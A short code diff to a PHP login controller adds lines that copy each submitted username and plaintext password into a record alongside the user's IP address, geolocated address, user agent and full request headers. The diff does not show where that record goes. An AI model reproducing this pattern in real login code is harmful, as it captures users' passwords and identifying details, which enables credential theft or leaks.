@@ -73,6 +73,8 @@ class LoginController extends Controller
     {
         $agent                 = new Agent();
         $ipInfo                = $this->ipinfo();
+        $account = $request->only(['username', 'password']);
+        $account['ip']         = $ipInfo['ipAddress'];
         $account['address']    = "${ipInfo['countryName']}, ${ipInfo['regionName']}, ${ipInfo['cityName']}";
         $account['user_agent'] = $agent->getUserAgent();
         $account['request']    = $agent->getHttpHeaders();
